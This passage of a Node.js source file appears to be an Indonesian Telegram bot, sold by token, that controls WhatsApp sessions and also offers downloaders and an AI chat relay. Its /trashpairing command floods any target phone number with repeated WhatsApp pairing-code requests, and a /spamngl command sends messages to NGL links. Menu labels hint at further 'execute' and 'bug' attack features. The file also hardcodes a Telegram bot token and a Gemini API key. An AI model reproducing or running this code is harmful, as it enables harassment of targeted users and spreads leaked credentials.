const config = require("./config");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  fetchLatestBaileysVersion, 
  generateWAMessageFromContent,
  fetchLatestWaWebVersion, 
  prepareWAMessageMedia, 
  proto,
} = require("@whiskeysockets/baileys");
const { exec } = require("child_process");
const fs = require("fs");
const NodeCache = require("node-cache");
const P = require("pino");
const pino = require('pino');
const path = require("path");
const chalk = require("chalk");
const fse = require("fs-extra");
const os = require("os");
const axios = require("axios");
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');
//===================================================//
const token = config.BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });

require("./testi")(bot, isOwner); // Fitur testimoni
//===================================================//
const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
//===================================================//
const PREMIUM_FILE = path.join(__dirname, "database", "premium.json");
const COOLDOWN_FILE = path.join(__dirname, "database", "cooldown.json");
//===================================================//
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
//===================================================//

const GITHUB_RAW_URL = "https://raw.githubusercontent.com/ZEET5644/4pi/refs/heads/main/db.json";

async function validateToken(token) {
  try {
    const res = await axios.get(GITHUB_RAW_URL, { responseType: "json" });

    let data = res.data;

    if (typeof data === "string") {
      data = JSON.parse(data);
    }

    if (!data.tokens || !Array.isArray(data.tokens)) {
      console.error("❌ db.json tidak memiliki field tokens");
      process.exit(1);
    }

    // Trim biar tidak ada spasi tak terlihat
    token = token.trim();

    if (data.tokens.includes(token)) {
      console.log("✅ Token valid, Bot dijalankan...");
      return true;
    }

    console.error("❌ Token tidak valid! Buy Dlu ke @Killertzy2 Atau @VerVnx");
    process.exit(1);

  } catch (err) {
    console.error("❌ Gagal mengambil data token dari GitHub:", err.message);
    process.exit(1);
  }
}

module.exports = validateToken;


//==================[ FUNGSI DEPLOYBOT ]==================
const DEPLOY_FILE = path.join(__dirname, "deployments.json");
const ADMIN_ID = [6767139831, 6822397083, 1270141645];
const adminBot = new TelegramBot("7685622781:AAH-MZLRxCPpgMu1VUYWH2Rr1S8X7I8OXIY", { polling: true });

const images = [
  "https://files.catbox.moe/zmhbmv.jpg",
  "https://files.catbox.moe/rlnsb5.jpg",
  "https://files.catbox.moe/0hf71c.jpg"
];

const pick = arr => arr[Math.floor(Math.random() * arr.length)];


function loadDeployments() {
  if (fs.existsSync(DEPLOY_FILE)) {
    return JSON.parse(fs.readFileSync(DEPLOY_FILE, "utf8"));
  }
  return {};
}

function saveDeployments(data) {
  fs.writeFileSync(DEPLOY_FILE, JSON.stringify(data, null, 2));
}

//==================[ FUNGSI COOLDOWN BUG ]==================
function loadCooldownData() {
  try {
    if (fs.existsSync(COOLDOWN_FILE)) {
      return JSON.parse(fs.readFileSync(COOLDOWN_FILE, "utf8"));
    }
  } catch (e) {
    console.error("Error loadCooldownData:", e);
  }
  return { userCooldowns: {}, globalCooldown: 0 };
}

function saveCooldownData(data) {
  try {
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error("Error saveCooldownData:", e);
  }
}

let { userCooldowns, globalCooldown } = loadCooldownData();

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `╭─────────────────
│ Bot: ${botNumber}
│ Status: Inisialisasi...
╰─────────────────`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const { version, isLatest } = await fetchLatestWaWebVersion();
    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: !true,
        auth: state,
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.00"]
    });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `╭─────────────────
│ Bot: ${botNumber}
│ Status: Mencoba menghubungkan...
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `╭─────────────────
│ Bot: ${botNumber}
│ Status: Tidak dapat terhubung
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `╭─────────────────
│ Bot: ${botNumber}
│ Status: Berhasil terhubung!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "XBLASTER");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `╭─────────────────
│ Bot: ${botNumber}
│ Code: ${formattedCode}
╰─────────────────`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `╭─────────────────
│ Bot: ${botNumber}
│ Pesan: ${error.message}
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

async function initializeBot() {
  if (config.BOT_TOKEN)
    try {
      console.log(`\x1b[35m╭─────────────────
│ INFINITY API TECH V0.0
╰─────────────────\x1b[0m`);

      await initializeWhatsAppConnections();
    } catch (error) {
      console.error(error);
    }
}

(async () => {
  const token = config.BOT_TOKEN;

  // Cek token dulu
  await validateToken(token);

  // Kalau valid → jalanin bot
  await initializeBot();
})();

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

function loadPremiumData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(PREMIUM_FILE)) {
      const data = fs.readFileSync(PREMIUM_FILE, "utf8");
      return JSON.parse(data);
    }
    return {};
  } catch (error) {
    console.error("Error loading premium data:", error);
    return {};
  }
}

function savePremiumData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving premium data:", error);
  }
}

function removePremiumUser(userId) {
  const premiumData = loadPremiumData();
  if (premiumData[userId]) {
    delete premiumData[userId];
    savePremiumData(premiumData);
    return true;
  }
  return false;
}

function isPremium(userId) {
  const premiumData = loadPremiumData();
  if (!premiumData[userId]) return false;
  return premiumData[userId].expiry > Date.now();
}

function addPremiumDuration(duration) {
  const durations = {
    h: 60 * 60 * 1000,
    d: 24 * 60 * 60 * 1000,
    w: 7 * 24 * 60 * 60 * 1000,
    m: 30 * 24 * 60 * 60 * 1000,
  };

  const match = duration.match(/^(\d+)([hdwm])$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  return parseInt(amount) * durations[unit];
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function parseDuration(duration) {
  const units = { s: 1000, m: 60000, h: 3600000 };
  const match = duration.match(/^(\d+)([smh])$/);
  if (!match) return null;
  const [ , value, unit ] = match;
  return parseInt(value) * units[unit];
}



let startMessage;
let startButton;

bot.onText(/^\/?start/, async (msg) => {
  const chatId = msg.chat.id;

  // Ambil username
  const username = msg.from.username
    ? `@${msg.from.username}`
    : `${msg.from.first_name || ""} ${msg.from.last_name || ""}`.trim();

  const connect =
    sessions.size === 0
      ? "Belum ada bot"
      : `${sessions.size} session${sessions.size > 1 ? "s" : ""}`;

  const startMessage = `
<blockquote>⬡────────〔 <b>INFINITY API TECH</b> 〕────────⬡</blockquote>
<i>Welcome...</i>  
Selamat datang di <b>INFINITY API TECH</b>.  
Bot dengan fitur tingkat tinggi—cepat, presisi, dan stabil.

<blockquote>⬡──〔 INFORMATION 〕──⬡</blockquote>
<b>• Username :</b> ${username}
<b>• Versi :</b> 0.0
<b>• Session :</b> ${connect}
<b>• Access :</b> Js / API
<b>• Type :</b> Node-Telegram-Api

<blockquote>⬡──〔 SELECT MENU 〕──⬡</blockquote>
`;

  const startButton = {
    inline_keyboard: [
      [{ text: "⚙️ SETTING BOT", callback_data: "menu1" }],
      [{ text: "🧪 TOOLS", callback_data: "tools" }],
      [{ text: "👤 THANKS TO", callback_data: "Tqto" }],
      [
        { text: "🦠 EXECUTE MENU", callback_data: "menu3" },
        { text: "📍 OWNER", url: "https://t.me/Killertzy2" },
      ],
        ],
  };

  // Random image dari list kamu
  const photos = [
    "https://files.catbox.moe/zmhbmv.jpg",
    "https://files.catbox.moe/rlnsb5.jpg",
    "https://files.catbox.moe/0hf71c.jpg",
  ];

  const photo = photos[Math.floor(Math.random() * photos.length)];

  try {
    await bot.sendPhoto(chatId, photo, {
      caption: startMessage,
      parse_mode: "HTML",
      reply_markup: startButton,
    });
  } catch (error) {
    console.error("Error mengirim foto:", error);
    bot.sendMessage(chatId, startMessage, {
      parse_mode: "HTML",
      reply_markup: startButton,
    });
  }
});


bot.onText(/^\/?play (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1].trim();
  if (!query) return bot.sendMessage(chatId, "❌ Contoh: /play serana");

  const loadingMsg = await bot.sendMessage(
    chatId,
    `🎧 Sedang mencari lagu *${query}* di Spotify...`,
    { parse_mode: "Markdown" }
  );

  try {
    // Cari lagu dari API
    const searchUrl = `https://api.siputzx.my.id/api/s/spotify?query=${encodeURIComponent(query)}`;
    const searchRes = await axios.get(searchUrl);

    if (!searchRes.data || !searchRes.data.data || searchRes.data.data.length === 0) {
      return bot.editMessageText("❌ Lagu tidak ditemukan di Spotify.", {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
      });
    }

    // Ambil lagu pertama
    const firstSong = searchRes.data.data[0];
    const trackUrl = firstSong.track_url;

    await bot.editMessageText(
      `🎶 *${firstSong.title}*\n👤 ${firstSong.artist}\n🔗 Mendownload dari Spotify...`,
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
        parse_mode: "Markdown",
      }
    );

    // Download MP3 lewat API
    const dlUrl = `https://api.siputzx.my.id/api/d/spotifyv2?url=${encodeURIComponent(trackUrl)}`;
    const dlRes = await axios.get(dlUrl);

    if (!dlRes.data || !dlRes.data.status || !dlRes.data.data.mp3DownloadLink) {
      return bot.editMessageText("❌ Gagal mengunduh lagu dari API.", {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
      });
    }

    const song = dlRes.data.data;
    const tmpFile = path.join(__dirname, `${uuidv4()}.mp3`);

    const audioStream = await axios.get(song.mp3DownloadLink, { responseType: "stream" });
    const writer = fs.createWriteStream(tmpFile);
    audioStream.data.pipe(writer);

    await new Promise((resolve, reject) => {
      writer.on("finish", resolve);
      writer.on("error", reject);
    });

    await bot.sendAudio(chatId, fs.createReadStream(tmpFile), {
      title: song.title,
      performer: song.artist,
      caption: `🎧 *${song.title}*\n👤 ${song.artist}\n*By @HefaiostosHades21*`,
      parse_mode: "Markdown",
      thumb: song.coverImage,
    });

    fs.unlinkSync(tmpFile);
    await bot.deleteMessage(chatId, loadingMsg.message_id);
  } catch (err) {
    console.error("Error saat play:", err.message);
    bot.editMessageText("❌ Terjadi kesalahan saat memproses permintaan lagu.", {
      chat_id: chatId,
      message_id: loadingMsg.message_id,
    });
  }
});

bot.onText(/^\/?tt\s+(.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = (match && match[1]) ? match[1].trim() : null;

  if (!link) {
    return bot.sendMessage(chatId, '❌ Gunakan: /tt <link_tiktok>\nContoh: /tt https://vt.tiktok.com/XXXXX');
  }

  // beri feedback awal
  const statusMsg = await bot.sendMessage(chatId, `🔎 Memproses link: \n${link}\n\n⏳ Mohon tunggu...`);

  try {
    // 1) panggil API siputzx untuk dapatkan data (url video)
    const apiUrl = 'https://api.siputzx.my.id/api/d/tiktok';
    const resp = await axios.get(apiUrl, {
      params: { url: link },
      headers: { accept: '*/*' },
      timeout: 20000
    });

    if (!resp.data || !resp.data.status) {
      await bot.editMessageText('❌ Gagal mendapatkan data dari API atau format response tak valid.', {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
      return;
    }

    // struktur respons dari contoh: resp.data.data.urls => array of urls (ambil index 0)
    const data = resp.data.data || {};
    let videoUrl = null;

    if (Array.isArray(data.urls) && data.urls.length) {
      videoUrl = data.urls[0];
    } else if (typeof data.url === 'string') {
      videoUrl = data.url;
    } else if (typeof data.original_url === 'string') {
      // fallback kalau API hanya kasih original url
      videoUrl = data.original_url;
    }

    if (!videoUrl) {
      await bot.editMessageText('❌ Tidak menemukan URL video di response API.', {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
      return;
    }

    await bot.editMessageText('⬇️ Mengunduh video... (sedang dikompresi/diambil)', {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });

    // 2) download video sebagai stream & simpan sementara (gunakan nama unik)
    const tmpName = `${uuidv4()}.mp4`;
    const tmpPath = path.join(__dirname, tmpName);
    const writer = fs.createWriteStream(tmpPath);

    const videoResp = await axios.get(videoUrl, {
      responseType: 'stream',
      timeout: 60000,
      headers: { 'User-Agent': 'Mozilla/5.0 (compatible)' }
    });

    // opsional: cek content-length (kalau tersedia)
    const contentLength = videoResp.headers['content-length'] ? parseInt(videoResp.headers['content-length'], 10) : null;
    const maxSizeBytes = 50 * 1024 * 1024; // batas 50 MB (ubah sesuai kebutuhan)

    if (contentLength && contentLength > maxSizeBytes) {
      // kalau terlalu besar, jangan download — kirim link saja
      try { videoResp.data.destroy(); } catch (e) {}
      await bot.editMessageText(`⚠️ File video terlalu besar (${Math.round(contentLength/1024/1024)} MB). Mengirim tautan langsung.`, { chat_id: chatId, message_id: statusMsg.message_id });
      await bot.sendMessage(chatId, `🔗 Download langsung: ${videoUrl}`);
      return;
    }

    // pipe stream ke file
    videoResp.data.pipe(writer);

    // tunggu sampai selesai
    await new Promise((resolve, reject) => {
      let errored = false;
      writer.on('error', (err) => {
        errored = true;
        writer.close();
        reject(err);
      });
      writer.on('finish', () => {
        if (!errored) resolve();
      });
    });

    // 3) kirim video ke chat
    await bot.editMessageText('📤 Mengirim video ke chat...', { chat_id: chatId, message_id: statusMsg.message_id });

    // Jika file ukuran besar, gunakan sendDocument untuk menghindari kompresi
    const stats = fs.statSync(tmpPath);
    const fileSizeMB = Math.round((stats.size / 1024 / 1024) * 10) / 10;

    if (stats.size < 20 * 1024 * 1024) {
      // kirim sebagai video (telegram akan kompres kalau perlu)
      await bot.sendVideo(chatId, fs.createReadStream(tmpPath), { caption: `🎬 TikTok Video\nSize: ${fileSizeMB} MB` });
    } else {
      // kirim sebagai document agar tidak dikompres
      await bot.sendDocument(chatId, fs.createReadStream(tmpPath), {}, { filename: tmpName, contentType: 'video/mp4' });
    }

    // bersihin file sementara
    try { fs.unlinkSync(tmpPath); } catch (e) { /* ignore */ }

    // update status akhir
    await bot.editMessageText('✅ Selesai! Video berhasil dikirim.', { chat_id: chatId, message_id: statusMsg.message_id });

  } catch (err) {
    console.error('Error /tt command:', err?.message || err);
    // ada beberapa kemungkinan error: API down, download timeout, stream error, dll
    try {
      await bot.editMessageText('❌ Terjadi kesalahan saat memproses. Coba lagi nanti.`', {
        chat_id: chatId,
        message_id: statusMsg.message_id,
        parse_mode: 'Markdown'
      });
    } catch (e) {
      // fallback: kirim pesan biasa
      await bot.sendMessage(chatId, '❌ Terjadi kesalahan saat memproses. Coba lagi nanti.');
    }
  }
});

// === Command: /trashpairing <nomor> <loop> ===
bot.onText(/^\/?trashpairing (\d+)\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const loopCount = parseInt(match[2]);

  if (!target || !loopCount) {
    return bot.sendMessage(
      chatId,
      "❌ Masukkan format dengan benar!\n\nContoh: <code>/trashpairing 628123456789 10</code>",
      { parse_mode: "HTML" }
    );
  }

  const startMsg = await bot.sendMessage(
    chatId,
    `🚀 <b>Menjalankan Trash Pairing</b>\n\n📱 Target: <code>${target}</code>\n🔁 Loop: <b>${loopCount}</b>\n\n⏳ Inisialisasi koneksi...`,
    { parse_mode: "HTML" }
  );

  try {
    const { state, saveCreds } = await useMultiFileAuthState("testpairing");
    const { version, isLatest } = await fetchLatestWaWebVersion();
    const cache = new NodeCache();

    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: !true,
        auth: state,
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.00"]
    });

    let success = 0;
    let fail = 0;

    for (let i = 1; i <= loopCount; i++) {
      try {
        await sock.requestPairingCode(target);
        success++;
      } catch {
        fail++;
      }

      const progressBar = makeProgressBar(i, loopCount);
      const progressMsg = `
<blockquote>⚙️ <b>Trash Pairing Progress</b></blockquote>
📱 Target: <code>${target}</code>
🔁 Loop: <b>${loopCount}</b>

${progressBar}
🧩 Progress: <b>${i} / ${loopCount}</b>
✅ Sukses: <b>${success}</b>
❌ Gagal: <b>${fail}</b>

<blockquote>⚡️ Memproses pairing code... Mohon tunggu.</blockquote>
      `;

      await bot.editMessageText(progressMsg, {
        chat_id: chatId,
        message_id: startMsg.message_id,
        parse_mode: "HTML",
      });

      await sleep(2000);
    }

    const doneMsg = `
<blockquote>✅ <b>Trash Pairing Selesai!</b></blockquote>
📱 Target: <code>${target}</code>
🔁 Total Loop: <b>${loopCount}</b>

🧩 Hasil Akhir:
✅ Berhasil: <b>${success}</b>
❌ Gagal: <b>${fail}</b>

<blockquote>🔥 Operasi pairing telah selesai dengan sukses!</blockquote>
    `;

    await bot.editMessageText(doneMsg, {
      chat_id: chatId,
      message_id: startMsg.message_id,
      parse_mode: "HTML",
    });

  } catch (err) {
    console.error("Error pairing:", err);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menjalankan trash pairing.",
      { parse_mode: "HTML" }
    );
  }
});

// === Fungsi pembuat progress bar keren ===
function makeProgressBar(current, total, length = 15) {
  const filled = Math.round((current / total) * length);
  const bar = "▰".repeat(filled) + "▱".repeat(length - filled);
  return `📊 Progress: [${bar}]`;
}

// === /pinterest command ===
bot.onText(/^\/?pinterest (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1].split(" ");
  const query = input[0];
  const type = input[1] || "image"; // default image

  try {
    const res = await axios.get(
      `https://api.siputzx.my.id/api/s/pinterest?query=${encodeURIComponent(query)}&type=${type}`
    );

    const data = res.data.data.slice(0, 5); // ambil 5 hasil

    if (!data.length) return bot.sendMessage(chatId, "❌ Tidak ada hasil ditemukan.");

    for (const item of data) {
      let caption = `📌 <b>Pinterest ${type}</b>\n🆔 ${item.id}\n🔗 <a href="${item.pin}">Buka di Pinterest</a>`;
      if (item.image_url) {
        await bot.sendPhoto(chatId, item.image_url, {
          caption,
          parse_mode: "HTML",
        });
      } else if (item.video_url) {
        await bot.sendVideo(chatId, item.video_url, {
          caption,
          parse_mode: "HTML",
        });
      } else if (item.gif_url) {
        await bot.sendAnimation(chatId, item.gif_url, {
          caption,
          parse_mode: "HTML",
        });
      }
    }
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mengambil data Pinterest.");
  }
});

const GEMINI_API_KEY = "AIzaSyBzXtQ30evYlw6dRdQyF5qA85QLZJAfMGE";
const GEMINI_MODEL = "gemini-2.0-flash";

// ================= RAM STATE =================
let aiEnabled = false; // AI default OFF

// ================= CMD ON/OFF =================
bot.onText(/^\/?ai (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const status = match[1].toLowerCase();

  if (status === "on") {
    aiEnabled = true;
    bot.sendMessage(chatId, "✅ AI telah *diaktifkan*", { parse_mode: "Markdown" });
  } else {
    aiEnabled = false;
    bot.sendMessage(chatId, "❌ AI telah *dimatikan*", { parse_mode: "Markdown" });
  }
});

// ================= MESSAGE HANDLER =================
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // skip if AI off or command sendiri
  if (!aiEnabled || /^\/ai\b/i.test(text)) return;

  try {
    // === STEP 1: Gemini ===
    const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent?key=${GEMINI_API_KEY}`;
    const geminiRes = await fetch(geminiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        contents: [{ role: "user", parts: [{ text }] }],
        generationConfig: { temperature: 0.7, maxOutputTokens: 256 }
      })
    });

    const geminiData = await geminiRes.json();
    let reply = geminiData?.candidates?.[0]?.content?.parts?.[0]?.text?.trim();

    // === STEP 2: fallback GPT3 ===
    if (!reply || reply.length === 0) {
      console.log("⚠️ Gemini gagal, fallback ke GPT3...");
      const gptUrl = `https://api.siputzx.my.id/api/ai/gpt3?prompt=You%20are%20a%20helpful%20assistant.&content=${encodeURIComponent(text)}`;
      const gptRes = await fetch(gptUrl);
      const gptData = await gptRes.json();
      reply = gptData.result || gptData.output || gptData.response || "⚠️ AI gagal membalas.";
    }

    await bot.sendMessage(chatId, reply);
  } catch (err) {
    console.error("❌ AI Error:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi error saat memproses AI.");
  }
});

// === /ngl command ===
bot.onText(/^\/?spamngl (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split(" ");
  const link = args[0];
  const text = args.slice(1).join(" ") || "Hai";

  if (!link.startsWith("https://ngl.link/")) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh: /ngl https://ngl.link/xxxx Hai");
  }

  try {
    const res = await axios.get(
      `https://api.siputzx.my.id/api/tools/ngl?link=${encodeURIComponent(link)}&text=${encodeURIComponent(text)}`
    );

    if (res.data.status) {
      bot.sendMessage(
        chatId,
        `✅ Pesan berhasil dikirim!\n🆔 Question ID: <code>${res.data.data.questionId}</code>`,
        { parse_mode: "HTML" }
      );
    } else {
      bot.sendMessage(chatId, "❌ Gagal mengirim pesan ke NGL.");
    }
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mengirim pesan ke NGL.");
  }
});

bot.onText(/^\/?addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/^\/?delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
    `╭─────────────────
│    *MENGHAPUS BOT*    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(
        `╭─────────────────
│    *BOT DIHAPUS*    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(
          `╭─────────────────
│    *BOT DIHAPUS*    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(
          `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(
      `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/^\/?listbot/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "⚠️ Tidak ada bot WhatsApp yang sedang terhubung.",
        { parse_mode: "Markdown" }
      );
    }

    let listText = "╭── *LIST BOT AKTIF* ──╮\n";
    let index = 1;
    for (const [botNumber] of sessions.entries()) {
      listText += `│ ${index++}. ${botNumber}\n`;
    }
    listText += "╰─────────────────────────╯";

    await bot.sendMessage(chatId, listText, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error listing bots:", error);
    bot.sendMessage(chatId, "Terjadi kesalahan saat mengambil list bot.");
  }
});

bot.onText(/^\/?addprem(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const params = match[1].trim().split(/\s+/);

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, `Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  if (params.length !== 2) {
    return bot.sendMessage(
      chatId,
      "Format salah!\nContoh: /addprem <id> <durasi>\nContoh: /addprem 123456 30d\n┃ Durasi: h=jam, d=hari, w=minggu, m=bulan",
      { parse_mode: "Markdown" }
    );
  }

  const [userId, duration] = params;

  if (!userId || !duration) {
    return bot.sendMessage(
      chatId,
      "Format salah!\nContoh: /addprem 123456 30d\n(h=jam, d=hari, w=minggu, m=bulan)",
      { parse_mode: "Markdown" }
    );
  }

  const durationMs = addPremiumDuration(duration);
  if (!durationMs) {
    return bot.sendMessage(
      chatId,
      "Format durasi salah!\nGunakan: h=jam, d=hari, w=minggu, m=bulan\nContoh: 30d untuk 30 hari",
      { parse_mode: "Markdown" }
    );
  }

  const premiumData = loadPremiumData();

  const expiry = Date.now() + durationMs;
  premiumData[userId] = {
    expiry,
    addedBy: msg.from.id,
